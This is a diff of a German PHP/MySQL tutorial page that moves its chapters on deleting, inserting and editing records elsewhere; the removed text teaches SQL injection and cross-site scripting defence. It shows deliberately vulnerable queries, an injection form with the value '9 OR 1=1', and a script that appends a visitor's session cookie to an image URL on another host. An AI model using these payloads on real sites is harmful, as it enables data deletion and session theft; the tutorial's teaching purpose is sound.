@@ -60,7 +60,10 @@
                           </div>
 			
 			
-			<p>Hier der Plan für die einzelnen Seiten dieser Applikation:</p>
+			<p>In diesem Kapitel werden wir die Web-Applikation weiter entwickeln,
+so dass Sie Daten nicht nur anzeigen, sondern auch löschen und editieren kann.</p>
+
+<p>Hier der Plan für die einzelnen Seiten dieser Applikation:</p>
 
 <table class="table table-condensed table-bordered" style="width:auto">
   <tbody>
@@ -72,7 +75,7 @@
     </tr>
     <tr>
       <td>Person löschen</td>
-      <td>delete.php</td>
+      <td>person_delete.php</td>
       <td>POST pid</td>
       <td>Löscht die Person mit der angegeben pid.</td>
     </tr>
@@ -103,332 +106,7 @@
   </tbody>
 </table>
 
-<h2 id="daten-lschen">Daten löschen</h2>
-<p>Das Löschen könnte so einfach sein: Ein Programm mit namen delete.php, das als Parameter die id der Person erhält, die gelöscht werden soll:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-$pid   = $_POST['pid'];
-$dbh-&gt;query(&quot;DELETE FROM person WHERE pid=$pid&quot; );
-</pre></div>
-
-<p>Dieses Programm ist anfällig für folgende Attacke: Ein Aufruf mit einem selbst gebastelten Formular setzt den Parameter pid auf Wert „9 OR 1=1“</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-&lt;form method=&quot;post&quot; action=&quot;delete.php&quot; &gt;
-    &lt;input type=&quot;hidden&quot; value=&quot;9 OR 1=1&quot; name=&quot;pid&quot;/&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;del all&quot;/&gt;
-&lt;/form&gt;
-</pre></div>
-
-<p>Das führt dazu, dass folgendes SQL-Statement ausgeführt wird:</p>
-
-<div class="example">
-<pre class="lang-sql prettyprint linenums">
-DELETE FROM person WHERE pid=9 OR 1=1
-</pre></div>
-
-<p>Und dieses Statement löscht nicht einen Datensatz sondern alle Datensätze. Diese Art von Attacke auf eine Web-Applikation nennt man „SQL Injection“.</p>
-
-<h3 id="sql-injection-verhindern">SQL Injection verhindern</h3>
-<p>Dieses Problem kann vermeiden indem man die Eingabe genau überprüft. In diesem Beispiel also: nur wenn es sich bei pid um eine ganze Zahl handelt, darf sie verwendet werde. Das wird hier mit einer Regular Expression (die Sie noch nicht verstehen müssen) überprüft:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-if( ! preg_match( '/^\d+$/', $pid ) ) {
-    error_log(&quot;hack: $pid statt id in delete.php.&quot;);
-    echo(&quot;Hack detected. Please stay at you computer until the police arrive.&quot;);
-    exit;
-}
-</pre></div>
-
-<p>Der zweite Ansatz ist die Verwendung von „Prepared Statements“ in der Datenbank. Dabei wird der SQL-Interpreter der Datenbank gänzlich umgangen. </p>
-
-<p>Als erster Schritt wird mit prepare ein SQL-Statement mit Fragenzeichen als Platzhalter vorbereitet. (Dieses SQL-Statement wird am Server schon mal geparsed und compiliert.) Mit execute wird das Statement ausgeführt, dabei werden die Platzhalter durch echte Daten ersetzt.  Das schöne dabei: es wird nie ein SQL-Statement als String gebaut, sondern die einzufügenden Daten werden binär an den Datenbankserver übertragen. Darin enthaltene SQL-Fragement können keinen Schaden anrichten.</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-$sth = $dbh-&gt;prepare(&quot;DELETE FROM person WHERE pid = ?&quot;);
-$sth-&gt;execute(array($pid));
-</pre></div>
-
-<p><code>execute</code> kann auch mehrfach ausgeführt werden, das ist effektiver als eine normales query zu wiederholen.</p>
-
-<h3 id="authorisierung-nicht-vergessen">Authorisierung nicht vergessen!</h3>
-<p>Wir haben eine Sicherheitslücke geschlossen, aber es bleibt trotzdem noch viel zu tun: Löschen, Einfügen, Bearbeiten soll nur nach dem Login möglich sein!</p>
-
-<h2 id="daten-einfgen">Daten einfügen</h2>
-<p>Hier das einfachste Programm, das ein neues Werk speichert:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-mysqli_query( $db, &quot;INSERT INTO werk (titel) VALUES ('$_POST[titel]')&quot; );
-</pre></div>
-
-<p>Das funktioniert für viele Eingaben, aber was passiert wenn ein Werk den Titel „That’s it“ haben soll? Dann wird folgendes SQL-Statement ausgeführt:</p>
-
-<div class="example">
-<pre class="lang-sql prettyprint linenums">
-INSERT INTO werk (titel) VALUES ('That's it')
-</pre></div>
-
-<p>Das kann nicht funktionieren. Für dieses Problem gibt es in PHP eine einfache und falsche Lösung:</p>
-
-<p>Normalerweise verändert PHP automatisch alle Daten die über GET, POST  und Cookies hereinkommen: vor alle Anführungszeichen wird ein Backslash eingefügt.  Aus „That’s it“ wird also automatisch „That's it“ , das SQL-Statement funktioniert wieder:</p>
-
-<div class="example">
-<pre class="lang-sql prettyprint linenums">
-INSERT INTO werk (titel) VALUES ('That\'s it')
-</pre></div>
-
-<p>Diese Automatik ist unter dem Namen „magic_quotes“ bekannt und kann in der Apache- oder PHP-Konfiguration abgeschalten14 werden. Auf dem MMT-Server ist sie generell ausgeschalten. Sie sollten das auf Ihrem lokalen Apache-Server auch tun:</p>
-
-<p><code>
-php_flag magic_quotes_gpc off
-</code></p>
-
-<p>Mit folgendem Programm können Sie testen ob auf dem Server magic quotes ein- oder ausgeschalten sind:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-echo( (get_magic_quotes_gpc() ? &quot;mit magic quotes&quot; : &quot;ohne magic quotes&quot;) );
-echo(&quot;&lt;pre&gt;&quot;);
-print_r($_POST);
-echo(&quot;&lt;/pre&gt;&quot;);
-</pre></div>
-
-<p>In Wirklichkeit kann man Sie nicht ganz abschalten<a href="http://at.php.net/manual/de/security.magicquotes.disabling.php">→</a>, aber das ignorieren wir besser. Das Problem betrifft nur Array-Parameter.
-Wenn die magic quotes abgeschalten sind kann man das SQL-Problem besser lösen: mit prepared Statements. Hier am Beispiel eines neuen Werkes:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-$sth = $dbh-&gt;prepare(
-  &quot;INSERT INTO person 
-    (uid,vorname,nachname, profil,mail,web, blog,feed,title, isfemale,ifshow) 
-      VALUES 
-    (?,?,?,?,?,?,?,?,?,?,?)&quot;);
-                  
-$sth-&gt;execute(
-        array(
-          $_POST['uid'],
-          $_POST['vorname'],
-          $_POST['nachname'],
-          $_POST['profil'],
-          $_POST['mail'],
-          $_POST['web'],
-          $_POST['blog'],
-          $_POST['feed'],
-          $_POST['title'],
-          $_POST['isfemale'],
-          $_POST['ifshow']
-        )
-      );
-// noch ohne Fehlerbehandlung
-</pre></div>
-
-<p>Beim Einfügen in die Personen-Tabelle kann es leicht zu Problemen kommen:  die Tabelle verlangt in 3 Spalten einen eindeutigen Eintrag, wenn man hier einfach nichts eingibt gibt das einen Fehler.</p>
-
-<p>So weit sollten Sie es nicht kommen lasse: Sie sollten die Eingaben aus dem Webformular schon vor dem INSERT prüfen und dann ausführliche, vollständige, deutsche Fehlermeldungen ausgeben.</p>
-
-<p><img  alt="Abbildung 149: Fehlermeldung der Datenbank vs. selbst gestaltete Fehlermeldung" src="/images/image367.png" /></p>
-
-<p>Falls das Einfügen der Daten funktioniert hat und in der Tabelle ein autoincrement-Feld als Primärschlüssel vorhanden ist, kann man den Wert des Schlüssels im neuen Datensatz auslesen und weiter verwenden:</p>
-
-<pre><code>  $pid = $dbh-&gt;lastInsertId(); 
-  header("Location: person.php?pid=$pid");
-</code></pre>
-
-<p>Auch hier ist eine Weiterleitung direkt nach dem POST-Request sinnvoll: nach dem Einfügen des Datensatzes wird direkZZt auf die Anzeige des neuen Datensatzes weitergeleitet. Falls man danach auf „Reload“ drückt wird der Datensatz neu angezeigt, aber keinesfalls ein zweites Mal eingefügt.</p>
-
-<h2 id="einen-datensatz-bearbeiten">Einen Datensatz bearbeiten</h2>
-<p>Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur Bearbeitung anbieten, und dann wieder in der Datenbank speichern.</p>
-
-<p><img  alt="Abbildung 150: Formular zum Bearbeiten einer Person" src="/images/image368.png" /></p>
-
-<p>Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-$sth = $dbh-&gt;prepare(&quot;SELECT pid,vorname,nachname,profil FROM person WHERE pid = :pid&quot;);
-$sth-&gt;bindValue(':pid', $_GET['pid'], PDO::PARAM_INT);
-$sth-&gt;execute();
-$person=$sth-&gt;fetchObject();
-</pre></div>
-
-<p>Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute und bei Textareas als Inhalt des Tags:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-  &lt;input name=&quot;vorname&quot; value=&quot;Tobias&quot;&gt;
-  &lt;textarea name=&quot;profil&quot; rows=&quot;7&quot;&gt;Webdesigner und Programmierer.&lt;/textarea&gt;
-</pre></div>
-
-<p>Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein Beispiel in MySQL:</p>
-
-<div class="example">
-<pre class="lang-sql prettyprint linenums">
-mysql&gt; select vorname,profil from person where pid=538;
-+---------------------+-----------------------------+
-| vorname             | profil                      |
-+---------------------+-----------------------------+
-| Tobias &quot;the coder&quot;  | Mein Lieblings-Tag: &lt;style&gt; |
-+---------------------+-----------------------------+
-1 row in set (0.00 sec)
-</pre></div>
-
-<p>So würde die Darstellung der Eingabefelder nicht funktionieren:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-  &lt;input name=&quot;vorname&quot; value=&quot;Tobias &quot;the coder&quot; &quot; /&gt;
-  &lt;textarea name=&quot;profil&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag: &lt;style&gt;&lt;/textarea&gt;
-</pre></div>
-
-<p>Richtig ist die Darstellung gewisser Zeichen als HTML entities:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-  &lt;input name=&quot;vorname&quot; value=&quot;Tobias &amp;quot;the coder&amp;quot; &quot; /&gt;
-  &lt;textarea name=&quot;profil&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag: &amp;lt;style&amp;gt;&lt;/textarea&gt;
-</pre></div>
-
-<p>Diese Ersetzung wird mit der Funktion htmlspecialchars vorgenommen:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-$person-&gt;vorname  = htmlspecialchars( $person-&gt;vorname  );
-</pre></div>
-
-<p>Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-// $pid  muss man nicht escapen, das ist blos ein integer
-    $person-&gt;vorname  = htmlspecialchars( $person-&gt;vorname  );
-    $person-&gt;nachname = htmlspecialchars( $person-&gt;nachname );
-    $person-&gt;profil   = htmlspecialchars( $person-&gt;profil   );
-
-include &quot;header.php&quot;;
-?&gt;
-&lt;form action=&quot;person_edit.php&quot; method=&quot;post&quot;&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;&lt;?= $person-&gt;pid ?&gt;&quot; /&gt;
-&lt;p&gt;&lt;label class=&quot;leftcol&quot; for=&quot;vorname&quot;&gt;Vorname&lt;/label&gt;   
-   &lt;input name=&quot;vorname&quot; value=&quot;&lt;?= $person-&gt;vorname ?&gt;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;label class=&quot;leftcol&quot; for=&quot;nachname&quot;&gt;Nachname&lt;/label&gt; 
-   &lt;input  name=&quot;nachname&quot; value=&quot;&lt;?= $person-&gt;nachname ?&gt;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;label class=&quot;leftcol&quot; for=&quot;profil&quot;&gt;Profil&lt;/label&gt;     
-   &lt;textarea name=&quot;profil&quot; rows=&quot;7&quot; cols=&quot;40&quot; &gt;&lt;?= $person-&gt;profil ?&gt;&lt;/textarea&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span class=&quot;leftcol&quot;&gt;&lt;/span&gt;&lt;input type=&quot;submit&quot; value=&quot;speichern&quot; /&gt;&lt;/p&gt;
-&lt;/form&gt;
-</pre></div>
-
-<p>Die veränderten Daten werden mit POST an person_edit.php geschickt. Aus den Daten wird ein UPDATE-Statement erstellt:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-if( $_POST['pid'] ) {
-  $sth = $dbh-&gt;prepare( &quot;UPDATE person SET vorname = ?, nachname = ?, profil = ?  WHERE pid=?&quot;);
-  $sth-&gt;execute(array(
-    $_POST['vorname'],
-    $_POST['nachname'],
-    $_POST['profil'],
-    $_POST['pid']
-  ));
-  header(&quot;Location: person.php?pid=$_POST[pid]&quot;);
-  exit;
-}
-</pre></div>
-
-<h2 id="escapen-von-html">Escapen von HTML</h2>
-<p>Das Escapen der Daten für HTML hätten wir von Anfang an bei jeder Ausgabe von Daten aus der Datenbank zu müssen. Also auch schon in Kapitel 6.3 beim Anzeigen der Daten. Damals haben wir einfach die Daten direkt mit echo ausgegeben:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-&lt;?= $anrede ?&gt;
-&lt;?= $person-&gt;vorname ?&gt;
-&lt;?= $person-&gt;nachname ?&gt;
-hat insgesamt  &lt;?= $werks_anz ?&gt; Werke in dieser Datenbank.
-</pre></div>
-
-<p>Wenn hier im Profil wieder „Mein Lieblings-Tag ist &lt;style&gt;“ steht, und dieser Text einfach ausgegeben wird, dann „verschwindet“ der Rest der Webseite, weil er sich nun innerhalb eines Style-Tags befindet.</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-$bildpfad  = htmlspecialchars( $person['bildpfad'] );
-$uid       = htmlspecialchars( $person['uid'     ] );
-$vorname   = htmlspecialchars( $person['vorname' ] );
-$nachname  = htmlspecialchars( $person['nachname'] );
-$profil    = htmlspecialchars( $person['profil'  ] );
-
-echo &lt;&lt;&lt;EOM
-    &lt;p&gt;&lt;img src=&quot;http://multimediaart.at/media/profil/$bildpfad&quot; style=&quot;float:right&quot; /&gt;
-    $anrede $vorname $nachname hat insgesamt x Werke in dieser Datenbank.
-    $ersie hat den Usernamen $uid.&lt;/p&gt;
-
-    &lt;div&gt;$profil&lt;/div&gt;
-EOM;
-</pre></div>
-
-<p>Damit funktioniert nun die Darstellung des Datensatzes richtig:</p>
-
-<p><img  alt="Abbildung 151: Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen" src="/images/image369.png" /></p>
-
-<h2 id="darstellen-von-html">Darstellen von HTML</h2>
-<p>Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags wieder anzeigen?</p>
-
-<h3 id="gefahren">Gefahren</h3>
-<p>Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-&lt;img src=&quot;http://laucher.net/bild.php?woher=gaestebuch_mmt&quot; alt=&quot;harmloses bild&quot; /&gt;
-</pre></div>
-
-<p>Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch identifizieren.</p>
-
-<p>Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen: Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer Vorherigen Suche noch ein Cookie haben.)</p>
-
-<p>Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ein:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-Hallo Welt 
-
-&lt;img src=&quot;http://users.local/bild.php&quot; alt=&quot;harmloses bild&quot; id=&quot;hack_tool&quot; /&gt;
-&lt;script&gt;
-   document.getElementById(&quot;hack_tool&quot;).src += &quot;?keks=&quot; + document.cookie;
-&lt;/script&gt;
-</pre></div>
-
-<p>Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-&lt;img id=&quot;hack_tool&quot; alt=&quot;harmloses bild&quot; src=&quot;http://users.local/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
-</pre></div>
-
-<p>So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!</p>
-
-<p>Lassen Sie niemals, niemals, niemals zu, dass Fremde Javascript in Ihre Site einspeisen können!</p>
-
-<p>Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und „wirkt nicht“:</p>
-
-<p><img  alt="Abbildung 152: Eingegebener HTML+Javascript-Code wird escaped und dargestellt" src="/images/image370.png" /></p>
-
-<h3 id="sichere-eingabe-von-html">Sichere Eingabe von HTML</h3>
-<p>Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags &lt;p&gt; und &lt;b&gt; verwendet werden können, mehr nicht. Dass es nur diese Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher gestellt:</p>
-
-<div class="example">
-<pre class="lang-php prettyprint linenums">
-$profil = strip_tags( $_POST['profil'], &quot;&lt;p&gt;&lt;b&gt;&quot; );
-</pre></div>
-
-<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen verzichten:</p>
-
-<p>Die Eingabe des HTML-Codes können Sie mit einem Javascript-Editor wie TinyMCE16 erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:</p>
-
-<p><img  alt="Abbildung 153: Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden" src="/images/image371.png" /></p>
+<p>Bei der Implementierung dieser Applikation lernen wir Schritt für Schritt verschiedene Sicherheitprobleme kennen.</p>
 
 		
 			<div class="pagination">
@@ -436,6 +114,8 @@ $profil = strip_tags( $_POST['profil'], &quot;&lt;p&gt;&lt;b&gt;&quot; );
     
       <li><a href="/php-mysql-2/">← <span class="article">Schreiben in die Datenbank</a></li>
     
+    
+      <li><a href="/php-mysql-2/daten-loeschen/">Löschen →</a></li>
     
   </ul>
 </div>
@@ -841,6 +521,18 @@ $profil = strip_tags( $_POST['profil'], &quot;&lt;p&gt;&lt;b&gt;&quot; );
                     
                       
                       <li class="active"><a href="/php-mysql-2/datenbank-schreiben/">Web-Applikation mit Schreibrecht</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php-mysql-2/daten-loeschen/">Löschen</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php-mysql-2/daten-einfuegen/">Einfügen</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php-mysql-2/daten-editieren/">Daten Bearbeiten</a></li>
                       
                     
                   
